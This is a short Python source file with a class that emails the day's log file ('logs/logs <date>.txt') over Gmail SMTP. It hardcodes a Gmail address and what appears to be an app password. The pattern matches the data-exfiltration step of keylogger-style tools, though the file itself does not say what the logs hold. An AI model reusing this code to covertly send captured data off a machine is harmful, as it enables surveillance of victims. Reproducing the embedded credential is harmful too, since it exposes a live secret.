import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class MAIL():
    def __init__(self) -> None:
        time1 = time.strftime("%d.%m.%Y, %H:%M:%S", time.localtime())
        data = ""
        for datas in range(10):  data = data + time1[datas]
        self.data = data

    def send_email(self):
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
        file_name = (f"logs/logs {self.data}.txt")

        with open(file_name, 'rb') as file:
            file_data = file.read()

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login('deercompany1122@gmail.com', 'jxaxksbisyczotcw')

        message = MIMEMultipart()
        message['Subject'] = f'Logs {self.data}'

        attachment = MIMEApplication(file_data, Name=file_name)
        attachment['Content-Disposition'] = f'attachment; filename=logs {self.data}.txt'
        message.attach(attachment)

        server.sendmail('deercompany1122@gmail.com', 'deercompany1122@gmail.com', message.as_string())

        server.quit()
